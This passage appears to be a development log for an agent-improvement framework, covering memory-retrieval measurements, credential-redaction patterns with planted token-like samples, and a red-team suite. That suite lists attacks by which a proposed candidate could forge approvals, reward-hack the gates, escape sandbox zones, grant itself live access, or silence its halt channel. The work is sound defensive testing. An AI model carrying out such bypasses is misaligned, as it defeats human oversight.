  no agent source at agents/migrated/graph.py in main
  (the ref exists; the file is not in it): no candidate
EXIT=0
```

`DEFAULT_AGENT_PATH` is what `aef migrate` writes into an ADOPTING repo, which
is exactly right and is ADR 0149's whole point; aef-core has `agents/demo/` and
`agents/summary/`, and the workflow passed no `--agent-path`. The workflow's
own case statement reads exit 0 as *"escalated, or nothing to propose"*.

ADR 0189 got the **sentence** right — it distinguishes an absent file from an
absent ref — and left the **disposition** wrong. Two parts: the workflow passes
`--agent-path agents/demo/graph.py`, pinned beside ADR 0188's `--graph-id` pin
with the pin deriving the path from the workflow and asserting the named file
exists; and the state itself is now `EXIT_ERROR`:

```
error (AgentSourceMissingError): no agent source at agents/migrated/graph.py in
main (the ref exists; the file is not in it), so there is nothing for the
proposer to edit. This is the invocation, not a verdict: pass --agent-path
naming a graph that exists at main. Python files under agents/ at main:
agents/demo/__init__.py, agents/demo/graph.py, agents/summary/__init__.py,
agents/summary/graph.py.
```

`EXIT=3`. The list is read from the ref with `git ls-tree`, never from the
working tree, because the candidate is built from the ref.

### F7 (LOW-MED) — the retry-cost bound is per call, and it is enforced per scenario

ADR 0185 said *"the retry costs at most one extra call per dead scenario"*.
The retry re-runs the whole SCENARIO, and a scenario costs as many calls as its
graph makes. On a two-call graph whose stub provider exits 7 on its fourth
invocation:

```
s1: score=1.0 dead=False retried=False
s2: score=1.0 dead=False retried=True
total provider invocations: 6
calls a clean 2-scenario run would have cost: 4
```

An erratum on the **statement**, not a change to the mechanism: the bound is
one extra scenario EXECUTION — up to K extra calls for a K-call scenario, at
worst one extra full corpus pass. The test asserts 6 *and* asserts `4 + 2`,
because "the bound is wrong" must not become "there is no bound".

The other half of F7 — reporting the evidence line in calls — is **not done,
and the reason is recorded rather than skipped**: G3's line is built from
`CohortVerdict.retried_scenarios` and no call count reaches it (the isolated
`ScenarioResult` carries none; the worker's `cassette` block stops at the
worker protocol). Threading it through would change four types and G3's own
reporting, and the gates' verdict logic was out of this wave's scope.

### Mutations

| # | perturbation | control that FAILED |
|---|---|---|
| M1 | restore the early `return None` in `_live_provider_from_base_ref` | `test_live_with_no_config_is_refused_by_name_before_anything_runs`, `test_the_worker_sandbox_is_widened_only_when_a_provider_will_be_built` |
| M2 | drop `live_provider_present` from `is_dead_call` | `test_a_live_miss_with_NO_PROVIDER_is_not_a_dead_call`, `test_the_same_miss_fails_when_no_provider_crosses` |
| M3 | `_foreign_run_ids(...)` → empty set | `test_the_default_proposer_no_longer_grounds_in_another_graphs_records`, `test_the_same_records_under_their_OWN_graph_id_are_admitted` |
| M4 | restore the `no candidate` return for a missing agent source | `test_the_default_path_missing_from_the_ref_refuses_instead_of_exiting_zero`, `test_the_cli_reports_it_as_EXIT_ERROR` |
| M5 | remove `--agent-path` from the nightly workflow | `test_this_repos_nightly_cycle_names_the_graph_file_it_may_edit` |

Every file restored from a byte backup and shasum-verified afterwards; no
`git checkout --` was used.

### What the wave is really about

Three of the four defects were a **request read as a fact**. `"live"` is what
the operator asked for, not what the provider did. `--graph-id` is what the
operator asked for, and one of three proposers honoured it. `--agent-path`'s
default is what this package guesses about a repo it has not looked at. In each
case the code that consumed the request was correct about the request and wrong
about the world, and in each case the repair was the same: carry the fact from
where it is known, and refuse when it is not known rather than proceeding on
the request.

---

## N2 — the arms re-run on the corpus that exists, and the knob answered for nothing (ADR 0193)

**Branch:** `upgrade/n2-dim2-one-model`, off `d8357c2`.
**Rubric claim, stated before any live call:** dimension 2, 12 → 14 only if the
pre-registered rule's first branch fires. Total before: 69.

**Why this ran.** ADR 0191 withdrew S1c's `+2` (ADR 0184) because ADR 0186
re-recorded eighteen corpus scenarios on Opus in the same hour, on a branch S1c
never saw, so its step 0 no longer reproduces on `main`. Withdrawn, not
disproved. *A measurement that cannot be re-run on the current tree is
asserted.*

**Step 0 — the seed, re-run first (0 live calls).** Same script, unchanged
logic, different table:

| | S1c (ADR 0184) | N2 |
|---|---|---|
| entries / signature | 1, `failure:check:working_memory.summary:max_words` | **identical** |
| recurrence | 3 distinct runs | **7** |
| confidence | 0.4286 | **0.6364** |
| lesson text ends | `…observed 31 words, 208 chars` | **`…observed 37 words, 233 chars`** |
| validation negatives | 4 | **8** |

`NEGATIVES` is now derived from each scenario's own trace and asserted, so a
corpus edit moves the list instead of invalidating the run silently.

**Step 1 — the knob's own A/B, for 0 calls.** Arm (c) at the shipped
`knowledge_boost=0.0` sends arm (b)'s prompts **byte for byte on all 17** (one
sha256, `c6873a50…`); the entry ranks 20–23 of 28 and never reaches the five
bullets `render_retrieved_context` renders. So (b)'s three live repeats ARE
(c)@0.0's, and the 34 calls ADR 0184 budgeted for this question were not spent.
Arm (c) ran at **8.0** — the smallest value on a 1.0 grid that keeps the lesson
in the prompt in all 17 scenarios under the WORST-case dry trajectory, chosen
offline before any quota.

**Step 2 — the arms.** 119 live calls, `claude-opus-5[1m]` on 119 of 119, equal
repeats this time:

| arm | repeats | mean | spread | negatives (n=8) | neg spread |
|---|---|---|---|---|---|
| (a) no retrieve | 1 | 0.9529 | – | 0.9000 | – |
| (b) raw records | 3 | **0.9373** | 0.0118 | 0.8667 | 0.0250 |
| (c) + knowledge @ 8.0 | 3 | **0.9843** | 0.0353 | 0.9833 | 0.0250 |

```
    (c) − (b) on the mean       = +0.0470     larger repeat spread    = 0.0353
    (c) − (b) on the negatives  = +0.1167     larger negatives spread = 0.0250
    BRANCH: 12 -> 14
```

**What arm (b) actually showed the model**, at every scenario, in every repeat:

```
- [success] no failure signals: 0 error(s) recorded, 0 tool call(s), none failed   (×5)
```

Five byte-identical no-op bullets. Seven records of a real recurring word-cap
failure sat in the same store, out-ranked by twenty near-duplicate successes.
ADR 0110's crowding thesis, live in a prompt rather than in a coverage proxy —
and the reason **(b) − (a) = −0.0156**, the fourth measurement of that
comparison and its third sign change.

**Config fix (ADR 0184's defect 2).** `knowledge_boost`, `staleness_half_life`
and `knowledge_min_occurrences` are now `aef.yaml` fields. Unset means `None`
and `build_retriever` omits it, so `MemoryRetriever`'s dataclass keeps the
single copy of every measured default; `0` is not unset (it disables the
demotion); each refusal mirrored at config-load time.

**Mutation:** 4 planted (falsy check for `is not None`; drop `**knobs`; move the
shipped boost default to 8.0; delete the boost validator) — 4 caught, every file
restored byte-identically and `shasum -a 256 -c` verified. No `git checkout --`.

**Not claimed.** `knowledge_boost`'s shipped default does **not** move. 8.0
guarantees engagement on a store holding exactly ONE entry; ADR 0110 measured a
raised boost displacing a precisely-relevant record when there are many, and
this corpus cannot form a second entry to test it on. What the default's basis
becomes is narrower and sharper: not "the knob buys nothing" but "the knob is
the difference between an inert layer and an engaged one here, and 8.0 is
unmeasured on a many-entry store".

**Green bar:** `pytest -q` 2891 passed, 7 skipped, 1 xfailed · `mypy aef
examples` clean · `ruff check .` clean · `ruff format --check` clean.

**Calls:** 120 of 120 (1 preflight + 17 + 51 + 51). Seed, static sweep, nine dry
arms and the knob's A/B cost 0.

**Score:** dimension 2 12 → 14, total **69 → 71**.

## N5 — `make measure`, and it is red on purpose (ADR 0196)

ADR 0188 gave dimension 5 nine of ten and named the missing point word for
word: *"several headline numbers reach a reader as docstring prose with the
data one directory away and no re-runner (`make measure`) that regenerates the
tables in CI"*. ADR 0191 had already paid the bill — S1c's `+2` **withdrawn
because its seed no longer reproduced**, found a night later, by hand.

`docs/research/measure.py` + `make measure`. Eleven runners, one shared
`--verify`: re-derive the published table from **committed raw data**, print
it, write nothing, **zero live calls in any mode** (committed JSON/JSONL, or a
cassette at `on_miss="fail"`). 53 rows across 13 measurements, each diffed
against **the ADR paragraph that publishes it** — the ADR is the expectation,
not a constant in the driver, so perturbing a number in an ADR fails exactly
like perturbing the data.

**Who needed changing.** Four already had `--report` (i14, j2, both j4) and
gained an alias. Three printed unconditionally and gained the flag (i12b, i12c
aggregates, and i12c's seed lost its mandatory `--out`). Four **could not
produce their published table at all**:

- `i12/aggregate.py` had raised `FileNotFoundError` on every invocation since
  its raw JSON was flattened out of `results/`. Path fixed; ADR 0155's table
  then reproduces exactly (0.8541 / 0.8541 / 0.8334 / 0.9166, spread 0.0833,
  84 calls).
- `i12b/seed.py` imports `write_check_failure_record`, removed by ADR 0180.
  ADR 0175's step-0 table has no runner on this tree. Recorded, not "fixed" —
  re-pointing it at a different producer would produce a different number.
- i13 had **no aggregator**: six raw `aef loop score --json` payloads and three
  tables typed by hand. New `i13/verify.py`; every number in ADR 0156
  reproduces, floor 0.7639 / regression 0.7361 / fall 0.0278 included.
- `pilot-marlin/scan_control.py` needed marlin's uncommitted `.aef/runs`; its
  `--verify` runs the same controls against a stand-in objective.

**What the first run found.** Two published numbers are stale and nobody had
said so: **ADR 0159's oracle B is 18/18 published against 10/18 re-derived**
(the one block `--report` recomputes live from `corpus/`, which ADR 0186 moved
to one model — 0186 disclosed exactly this for v2 and did not check v1), and
`j4/report-tally.txt` still says `helpful=7` where ADR 0180's own correction
says 6. No committed result file was edited: the ADR is pinned, the artefact is
labelled.

**The key case, verbatim:**

```
=== i12c-seed — S1c step 0 — the seed ADR 0184's +2 rests on
    ok    train scenarios                              20
    XFAIL failure records                              ADR says '3', re-derived '7'
    XFAIL records the excerpt property covers          ADR says '23', re-derived '27'
    XFAIL entry recurrence (distinct runs)             ADR says '3', re-derived '7'
    ok    consolidated entries                         1
```

Expected, recorded, and the withdrawn row's evidence. Note that `i12c-arms` —
the arm tables, from the committed `arms.jsonl` — reproduces in full: it is the
seed underneath that moved, which is why 0191 withdrew the score and not the
table.

**Red on purpose.** `make measure` exits 1 while ANY row drifts, explained or
not: a published number that no longer re-derives is a number nobody should
cite. CI runs `make measure-ci` (`--fast --against-expectations`), which fails
when the drift set **changes** — a new drift, and equally a known drift that
healed and left a stale note. If N2's re-run makes ADR 0184's seed reproduce,
CI goes red until the note comes out.

**Mutation.** `| (b) raw records | **0.9176** |` → `**0.9999**` in ADR 0175:
`DRIFT (b) raw records, mean  ADR says '0.9999', re-derived '0.9176'`, and
`make measure-ci` exits 1 with `NEW DRIFT`. Restored, `shasum -a 256` matched
`83e9a571…`. The same mutation is automated in
`test_a_perturbed_published_number_is_caught` against a symlinked shadow tree,
so nothing committed is written.

Green bar: `pytest -q` **2930 passed, 7 skipped, 1 xfailed** (was 2885 + the 45
this increment adds), `mypy aef examples` clean on 135 files, `ruff check .`
clean, `ruff format --check` clean.

## N6 — the shapes this repo actually carries (ADR 0197)

M6 (ADR 0163) scanned a real repo clean and named its own residual: marlin's
boundary rule is written around a subscription UUID and the pattern list did
not match it, because ADR 0126 removed `-` from `opaque_secret` to stop
`migrate-the-customer-billing-pipeline-to-v2-with-zero-downtime` being redacted
into a placeholder.

Reproduced first, eleven shapes planted one at a time. **Five findings, one of
them known:**

```
uuid                substitutions=0  -> ...(contact 7e16b0bb-b75a-4a16-9765-839cf1b96755)
slack_token         substitutions=0  -> ...789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx)
jwt                 substitutions=2  -> ...ACTED:opaque_secret].[REDACTED:opaque_secret])
github_token        substitutions=1  -> ...ion service (contact [REDACTED:opaque_secret])
connection_string   substitutions=1  -> ...stgres://svcuser:[REDACTED:email]:5432/marlin)
```

A JWT torn into two opaque secrets, a GitHub PAT caught under the wrong name,
and a database URL reported as an **email** with `svcuser:` surviving in the
clear. A label is not cosmetic — "something opaque leaked" and "your production
database URL leaked" are different incidents.

Six named shapes added: `connection_string` (first, ahead of `email`), `jwt`
(after `bearer`, so `Bearer <jwt>` stays a bearer header), `uuid`,
`github_token`, `slack_token`, and five more AWS key prefixes. `-` is still
absent from `opaque_secret`; the UUID gets in by structure — every group
hex-only and length-exact — not by weakening.

**And one the increment was not looking for: `api_key` did not match a real
Anthropic key.** Its middle was `(?:live|test|ant|proj)?[-_]?`, one optional
segment from a fixed vocabulary, so on `sk-ant-api03-<36>` the `ant` consumed
the slot and `api03` was left in front of a class with no hyphen: **no match at
all**. Now `(?:[-_][A-Za-z0-9]{2,10}){0,3}`.

`find()` applies patterns in order now, so the labels are the ones a redaction
would actually stamp; the detector is not weakened, and the proof is two lines
(if any pattern matches, the first such still matches, because nothing before
it changed the text).

**The seam, found by the full suite going red.** A run id is a `uuid4` the
harness assigns, so once `uuid` was a pattern the output scan matched the
scenario's own `id` and `initial_state.run_id` and **every harvest of a
recorded run was rejected "a secret survived redaction"** —
`tests/cli/test_run.py::test_a_recorded_run_re_executes_identically_and_is_harvested`.
That is ADR 0126's F12 exactly, one field over. `_scannable` drops the two
harness identifiers **by exact field path**, never by teaching a pattern to
ignore a shape, with a control that a tenant-typed UUID is still caught.

**What the scanner finds in committed artefacts.** All of `docs/research/` and
all of `corpus/`: **no credential**. 58 `uuid` matches (run ids, session ids,
the scratch path segment), 66 `opaque_secret` (every `RecordedCall.key`,
`prompt_sha256`, and the audit ledger's `entry_hash`/`previous_hash` chain —
worth knowing: a harvest that ever scanned a ledger would reject it), and the
planted controls themselves. The one real identifier is marlin's subscription
UUID, quoted deliberately in ADR 0163 as the residual's evidence; it is an
Azure subscription id rather than a credential, published by its owner in
marlin's own `AGENTS.md`, and it was **not** retro-redacted — redacting the
four places it stands would make 0163's finding untraceable and leave the value
in marlin's repo regardless. Stated as a judgement, the owner's to overturn.

**Mutation**, each pattern dropped in turn, restored with `shasum -a 256`
verified against `beb0f1be…`: `uuid` → 4 failures, `jwt` → 2, `github_token` →
3, `slack_token` → 3, `connection_string` → 5, and `api_key` reverted to its
pre-0197 pattern → 1 (`sk-ant-api03-…`). Six for six.

Erratum appended to ADR 0163 §5 with the new number; `make measure` pins the
line against the erratum, so the closure is re-checked rather than asserted.

---

## N7 — The cold-start pilot: `peptideindex` (2026-09-05)

**Branch:** `upgrade/n7-peptide-pilot`, off `d8357c2`.
**Rubric claim, stated before the work:** dimension 7, **3 → 5**, and only if
all three of these fired — real runs of a real repo's real job entered the
corpus **through `harvest`** (counts quoted, control passed), a candidate was
proposed **grounded in those harvested records**, and the gates reached a
**verdict on it live**. If harvest admitted but the cycle grounded in bootstrap
evidence instead, +1 and say which. If harvest refused, +0 and quote why.
Total before: 69.

**Model:** `claude-opus-5[1m]`. **40 live model calls** of a ≤ 60 budget:
1 preflight, 5 objectives, 4 re-recordings forced by F-N7-1, 30 cassette misses
inside the gates' worker.

**Safety.** Steps 1–6 ran on a clone at `<scratch>/peptide` whose `origin` was
removed before anything ran. Step 7 touched `/Users/raptor/peptideindex` and
only as ADR 0192 §7 describes: one local branch, one commit, never pushed,
`master` at `5752fcf3e` unchanged, the two pre-existing untracked paths
untouched. Undo: `git -C /Users/raptor/peptideindex branch -D aef/adopt`.

### What was measured

| step | result |
|---|---|
| `adopt` on an agentless repo | 16 files, **all new**, nothing appended and nothing modified; `.gitignore` correctly skipped (line 2 is `__pycache__/`); a second `adopt` left all 17 byte-identical, `shasum -c` |
| `migrate` on an agentless repo | `found 0 call site(s)`, `found 0 prompt agent(s)`, `0 yours + 1 aef's own` skill; `build_graph()` **raises** |
| L1 (ADR 0189) on `master` | term 2 on the clone, term 1 on a clone-of-clone, term 1 on the owner's checkout answering `'master'` while HEAD was on `aef/adopt`; `--base main` → `EXIT_ERROR`; `proposed` ledger event records `base: master` |
| one persona | `price-freshness-reviewer`, four rules all lifted from this repo's own code and its HEAD commit; `migrate` → one graph |
| five objectives, live | 5 calls, 211–394 words, containment recorded on every one; **first live end-to-end exercise of ADR 0190's recorder fix** — 5 cassettes, 5 declarations |
| `harvest` | 1 of 5 admitted, 4 rejected — **F-N7-1** |
| redaction | 0 substitutions, 0 refusals; control 5/5 shapes, 2/3 keys; residual named |
| owner checks | 3 rules, values computed; **2 of 5 fail**, one signature, two distinct runs |
| `bless` / `doctor` | baseline v1; **4 of 6** obligations met, up from 1 of 6 at cold start |
| one cycle, live | **REJECT by G3**, drift 0.057/0.500, `live_model_calls: true`, EXIT 1 |
| grounded in harvested evidence | **yes** — both `grounded_in` ids trace to `source: harvest` scenarios; corpus is `{"harvest": 5}` |
| `monitor` / `digest` | ran — **F-N7-2** |
| the real repo | 1 commit, 16 files, 2691 insertions, 0 deletions, no push |

### The two defects, reported not fixed

**F-N7-1 (HIGH).** `harvest._reexecution_services` reproduces the clock, the
model, the cassette and (since ADR 0190) the provider's isolation declaration —
and hard-codes `memory=InMemoryMemoryStore()`. Since ADR 0118 every generated
prompt-agent graph is `retrieve -> prompt_agent -> …` and the retrieved lessons
go into the **user turn**, so the request depends on the durable store, the
store grows with every run, and the replay always sees an empty one. Run k saw
k−1 lessons; only the first run against a given store is harvestable. Isolated
to one variable offline: as shipped **1 of 5**, with the memory the run itself
saw **5 of 5**.

**F-N7-2 (MEDIUM).** `loop.digest()` never passes `scenarios_added`, and the
`digest` sub-parser has no `--corpus`, so `Scenarios added to the corpus` is
`build_digest`'s default in every invocation there has ever been. ADR 0190
keyed a new warning off it — *"the ingestion path is broken, not quiet"* —
which fired here on a day `harvest` had admitted all five minutes earlier.
Identical output with the corpus present and with it emptied.

**F-N7-4 (HIGH), found at commit time and not during the pilot.** Worker N5's
ADR 0197 landed on the trunk an hour after §5 of ADR 0192 named the UUID as
this repo's redaction residual, and added a `uuid` pattern citing ADR 0163 for
that reason. It is the right pattern; **a recorded run's own id is also a
UUID**. Two arms over the same five real runs, one variable — the pattern list:

```
== BASE  (5 patterns, no uuid)      promoted 5 run(s) to the train split
== TRUNK (10 patterns, ADR 0197)    promoted 0 run(s) to the train split
                                      5 REJECTED, a secret survived redaction
                                      5 substitution(s) made by the redaction policy
```

Both halves bite: `redact_state` rewrites `AEFState.run_id` to
`[REDACTED:uuid]` — the identifier every join in the grounding chain runs on —
and the output scan then refuses the run anyway, because the trace still
carries the id the state no longer does. Reported, not fixed, and deliberately
not softened into "extend the allowlist": two shapes that are both UUIDs must
behave differently, which is a decision about *where* the scan runs, and it
belongs to whoever owns ADR 0197.

**F-N7-3 (LOW).** The generated checklist tells an owner of an agentless repo
to "identify your current entrypoint(s) — the function(s) that start an agent
run" two lines above "no legacy code to migrate". Item 3 is in
`render_migration_checklist`'s `common` list and is emitted for `framework:
none` as well.

**One observation, no claim of harm.** `git add -A` — the gesture the brief and
the obvious workflow both use after `adopt` — would have swept this owner's two
untracked working directories (18 files, 548K) into the scaffold commit. The
sixteen adopt-written paths were staged by name instead.

### Verdict

**Claim met in full: dimension 7, 3 → 5. Total 69 → 71.** The two honest
qualifications are inside the row: four of the five harvested runs were
re-recorded without `--memory` to route around F-N7-1, and the two grounding
records share one check signature on one failure family. The last five points
are unclaimed and no work on this machine can earn them — **peptideindex is the
owner's own repo, not a third party.**

**One thing the +2 does not survive unchanged:** F-N7-4 means the corpus this
increment built cannot be rebuilt on the trunk as it stands. The measurement
happened, its artefacts are committed, and the row says what it says — but the
next worker to re-run this pilot gets `0 promoted` until F-N7-4 is settled, and
that is stated here rather than discovered by them.

**Artefacts:** `docs/research/pilot-peptide/` (every command's real output,
scanned with the shipped `RedactionPolicy` before committing) and ADR 0192.

---

## N3 — the round becomes a suite (ADR 0194)

**Branch:** `upgrade/n3-redteam-and-halt`, off `d8357c2`.
**Rubric claim:** dimension 4, +1 of the 2 J0b deducted (N4 below claims the
other). Total before: 72.

**Expectation, stated before the work.** J0b's dim-4 deduction had two halves
and this increment closes the first: *"adversarial rounds exist as a document
I was not allowed to read, not as an executable red-team suite."* I expected to
find that the seven attacks were enforced only by prose, and that at least one
of them had no test running the exploit at all.

**Reproduce (RUN, before any change).** Read what actually held §2 in place:

```
tests/harness/test_trust_case.py
  ::test_the_adversarial_section_reports_failures_not_only_successes

    assert text.count("BROKE IT") >= 2
    assert "demonstrated bypass" in text
```

Two string searches over a markdown file, plus a **26-line comment inside the
test** mapping each attack to whichever existing test happened to exercise the
same control. That comment was not laziness — it was written by an earlier
worker precisely because a previous blind reviewer had read the prose as the
record of the round (ADR 0151, dim 4). It was the honest response available at
the time, and it is still a hand-maintained mapping, in prose, inside a test
that cannot notice itself going stale.

The concrete failure mode, stated so it is checkable: delete
`assert_shadowable`, or empty `_ZONE_B_ROOTS`, and **no test in this repository
would have said "A5 is live again"**. The trust-case test would have said,
correctly, that the document still contains the words `BROKE IT`.

**Built.** `tests/adversarial/`, 18 modules, one per attack. Each does three
things and the third is the increment:

1. builds the hostile input — candidate, tag, manifest, diff, graph id, config;
2. runs it through the real control, imported from `aef/`, asserts the refusal;
3. **mutates the control away and asserts the attack lands.**

Step 3 is what separates this from a green bar. A test that passes because the
exploit was never viable looks, from outside, exactly like a test that passes
because the defence worked. Most modules say so in the assertion message: *"the
attack above proves less than it claims if this half stops failing."*

Mutation is in-process (`monkeypatch`), so it is re-runnable in CI and cannot
leave the tree edited — a test that rewrites `aef/` and restores it is one
interrupted run away from a tree nobody inspects.

**The attack list, with what each mutation actually did.** Seven from the
document; eleven added, ten of which have a known-good exploit because they
were found and reproduced on this system rather than imagined for a document.

```
A1  Tier-1 from config/env/flag   pass tier1_enabled=True    -> AUTO_MERGE
A2  forged manifest               compare_digest -> True     -> forgery verifies
A3  signature replay              drop head_sha from payload -> replay verifies
A4  MUTATING shadow node          assert_shadowable -> noop  -> host marker written
A5  shadow does direct file I/O   containment OFF            -> host marker written
A6  tenant tag search             drop the CanarySalt        -> oracle goes chance -> 100%
A7  harness via evaluator.suites  _forbidden_prefixes -> ()  -> aef.harness.loop:gate resolves
A8  Zone A symlink                _zone_a_escapes -> {}      -> baseline is 16 bytes of a path
A9  diff leaves Zone A            _ZONE_B_ROOTS -> ()        -> G0 PASSES a harness rewrite
A10 bytecode in the drift budget  delete adopt's .gitignore  -> .pyc staged, drift over 0.500
A11 ../escape graph id            segment_refusal -> ""      -> writes ABOVE the archive root
A12 reward hack                   delete the MUST_FAIL rows  -> G2 stops firing
A13 placebo carries the treatment _content_words -> frozenset() -> null drawn from the lesson
A14 kill the provider you lose to max_dead_fraction=1.0     -> PASSES on chosen survivors
A15 provider fact as a lesson     _names_a_provider_fact->False -> pasted into the persona
A16 marker pair in adopter prose  match the BARE marker      -> the adopter's rule is deleted
A17 self-granted live login       read the candidate's ref   -> the branch grants itself
A18 silence your own halt         read the working tree      -> the halt reaches nobody
```

**18 attacks, 18 mutations, 18 caught.**

**Two attacks get through on purpose, and say so.** `assert_shadowable` refuses
MUTATING and **not** EXTERNAL_CALL — the container is that control, which is
exactly what §2.1 says — and A14's residual is real: a candidate can kill up to
`MAX_DEAD_FRACTION` and have those scenarios excluded, one scenario on the real
six-scenario corpus. Both are written as tests that pass by getting through,
with docstrings saying that if they ever start raising, the trust case's
mapping is stale and should be re-read rather than quietly enjoyed. A list
where everything held is the completeness claim §2.5 has three ADRs about.

**The grep test is replaced, not supplemented.** What stands in its place
compares the document and the directory **in both directions**: an attack named
with no module is a claim with nothing behind it, and a module with no line in
the prose is a control the owner reading §2 is never told about. A second test
asserts every module carries `test_a<n>_the_control_is_load_bearing`, so the
mutation discipline is a fact about the files rather than a hope about their
contents. Neither can be satisfied by editing prose.

**Three file-level mutations, because `monkeypatch` is not enough.** It proves
a code path is reached and matters; it does not prove the suite would catch an
edit to the shipped source. Backups copied, sha256 recorded, restored by copy
and re-verified:

```
--- baseline ---     a9: rc=0 2 passed   a11: rc=0 8 passed   a18: rc=0 1 passed
M1 zones.py   `for root in _ZONE_B_ROOTS:` -> `for root in ():`
   a9:  rc=1  1 failed, 1 passed        restored, sha256 c1052342ab41af9e…
M2 archive.py `refusal = segment_refusal(graph_id)` -> `refusal = ""`
   a11: rc=1  8 failed                  restored, sha256 827f61b667d13b2d…
M3 loop.py    `_halt_channel` against `cand` rather than the base ref
   a18: rc=1  1 failed                  restored, sha256 99344b67f1c0a5c5…
--- after ---        a9: rc=0 2 passed   a11: rc=0 8 passed   a18: rc=0 1 passed
```

M1 is the one worth reading: **one of two, not both**. The traversal attack
(`agents/../aef/kernel/executor.py`) still refused, because `_segments` rejects
`..` before any zone question is asked. Defence in depth, measured rather than
assumed — and the reason the table above records what each mutation DID rather
than "the control is load-bearing".

**Verdict: dimension 4, +1 (with N4's +1, 13 → 15).** The document can no
longer drift from the round it reports, in either direction, and 106 tests run
in 12 seconds. What has NOT changed, and is now stated in §2.0 of the trust
case where an owner reads it rather than only in an ADR: the suite is still
written by the party that wrote the defences (§3 prices that in, and no
automation removes it); a mutation proves a control load-bearing against *the
exploit that module builds*, not every exploit of its class; and a control
removed in-process is not a control removed from a deployment.

---

## N4 — a halt that reaches someone (ADR 0195)

**Rubric claim:** dimension 4, the other +1. Same branch, same total before.

**Expectation.** J0b's second dim-4 fact was a line the system printed about
itself: *"`aef loop digest` printed `Halt channel configured: NO`."* I expected
to find an unconfigured feature. I found something worse.

**Reproduce (RUN, before any change).** Engage the kill switch, halt, look:

```
=== A: no halt_channel block (today's default) ===
kill switch engaged  : True
ledger HALTED entries: ['halted']
halt entry detail    : {'reasons': ['a gated change regressed live']}
external file exists : False
digest> - Halts: 1
digest> - Halt channel configured: NO
```

The loop halted correctly, wrote `HALT.md` into a checkout nobody was looking
at, appended a tamper-evident ledger entry nobody was reading, and told no one.
`05-approval-policy.md` §7 says a halt must not depend on someone reading
GitHub email; this depended on someone noticing the loop had stopped.

Then the part that changes the reading. `HaltNotifier` had a `webhook_url`,
and **nothing in `aef/` ever called `notify`** — grep found `_halt_notifier()`
constructed for `.configured` and never for its behaviour, with the URL coming
from `AEF_HALT_WEBHOOK`, which no workflow sets. So `Halt channel configured:
NO` did not mean *the owner declined to configure it*. It meant *there is
nothing an owner could configure and have run*: the ADR 0100 shape, in the one
surface whose entire job is to say when something has gone wrong.

**Built.** `halt_channel:` in `aef.yaml` — an argv template, the same shape as
`model_provider.impl: command` (ADR 0154), for the same reason: this repo does
not know how its owner is paged, so it ships no webhook client, no SDK, no new
dependency and no guess. `{reason}` is a slot; the reason, the timestamp and
**the ledger's last entry** go to the command's stdin as one JSON object, so
the page says which candidate and when without the reader opening the ledger.

Six decisions inside that, each of which could have gone the other way, and
each with a test:

- **Read from the BASE REF** (ADR 0082/0181). The halt most worth delivering is
  by construction the one a candidate caused — a rollback of a change every
  gate passed halts *because* the gates have a blind spot. A channel a
  candidate could delete on its branch is one it would. This is A18 above.
- **One resolver for the halt and the digest.** A digest printing `yes` while a
  halt found nothing to run is this same defect one level up, and harder to
  notice.
- **The kill switch is engaged BEFORE the channel runs**, so a channel taking
  its whole timeout leaves no window in which the loop is still runnable.
- **Every failure is recorded and none masks the halt** — a missing program, a
  non-zero exit, a timeout, an unloadable `aef.yaml`. The halt matters more
  than the notification.
- **`argv[0]` only** reaches the ledger and the digest. The rest of a command
  line is where a token ends up when somebody writes one there, and the ledger
  is committed evidence.
- **The digest reads notifications from the LEDGER**, not from a parameter: the
  process that halted is long gone by the time anyone runs `digest`, and a
  channel that is configured and failing looks identical, from the config
  alone, to one that works.

**Measured, all three states, `/bin/sh -c 'cat >> file'` as the channel — a
real subprocess, zero network:**

```
=== B: halt_channel naming /bin/sh -c 'cat >> file' ===
external file exists : True
external file content: '{"at": "2026-09-05T03:00:00+00:00", "event": "halt",
  "last_ledger_entry": null, "reason": "a gated change regressed live"}'
halt entry detail    : {'halt_notification': {'command': '/bin/sh',
  'delivered': True, 'detail': 'exit 0'}, 'reasons': [...]}
digest> - Halt channel configured: yes — /bin/sh (2 argument(s))

=== C: a channel that fails ===
digest> - 2026-09-05T03:00:00+00:00 FAILED: /bin/false — FileNotFoundError:
        [Errno 2] No such file or directory: '/bin/false'; the halt still stands
digest>   **A halt notification FAILED.** The halt still stands; what did not
digest>   happen is you being told about it. Fix the command, not the loop.
```

And state A is no longer merely a `NO`: it now also reads `NOT SENT: no halt
channel was configured when the loop halted`, from the ledger, in the place the
owner is already looking.

**What this does NOT do**, stated in the ADR because the alternative is an
owner believing they are covered: it does not retry (a retry would be a queue,
and a queue that loses its process loses the message; the durable record is the
ledger and this is the doorbell); it does not page anyone by itself (it runs a
command, and what that command reaches is the command's business); and it is
exactly as reliable as the command the owner wrote — `delivered` is an exit
status, named after the thing this code can observe, and it is not "the owner
saw it".

**What would earn the rest of dimension 4**, also in the ADR: the channel has
never fired on a real regression on a real repo, so "the owner would be told"
is a property of the code rather than of the deployment; `aef loop digest`
takes no `--config`, so the channel is resolved through `DEFAULT_CONFIG_PATH`
(`aef.yaml` at the base ref) — a documented convention rather than a guess,
and an explicit flag would still be better; and an exit code is thin delivery
evidence where a channel could give more.

**Verdict: dimension 4, +1. With N3, 13 → 15; heading 72 → 74.** The line can
still print `NO`, and that is now correct: it means the owner has not named a
command. What it can no longer mean is that there was nothing to name.


## N8 — the tree grew from the rejections, and none of it was better (ADR 0198)

J0b left dimension 6 at 7/10 on two clauses: *"no measured run where a
stepping stone produced a better descendant; no owner-facing `aef loop lineage
list`."* One is a measurement, one is a command.

**S4's blocker was reproduced from its own raw data before anything was
built.** `docs/research/j2/results.jsonl` says the same thing fifteen times:
every turn that reached G3 scored `0.5` against an incumbent of `0.5` and was
refused by G2 for trading one scenario for another. A keep on that corpus
needed a single `draft_prompt` edit scoring 1.0, and parent selection cannot
change what a proposer writes — so the rig moved, to the one place in this
repository where the keep is reachable by construction.

`agents/demo` has two constants and its docstring says why. Measured, not
assumed (`run_j2b.py --probe`): 3/3 → **0.5000**, 4/3 → 0.5000, 3/4 → 0.5000,
**4/4 → 0.6667**, 5/5 → 0.8333. A one-constant candidate is *neutral*, so G3
rejects it, and it is a stepping stone by construction: the only route to 4/4
runs through a rejection. (The first run of that probe was wrong and is
recorded: `RETRY_BUDGET = 3` and `= 4` are the same size, CPython invalidates
a `.pyc` on mtime-in-seconds plus size, and rewriting inside one second re-ran
the previous variant's bytecode. The loop itself is immune — every turn gets
its own workspace.)

Four arms, fresh clone and state each. **16 live calls** for the LLM arms —
the demo corpus is recorded traces with no model calls, so a turn costs the
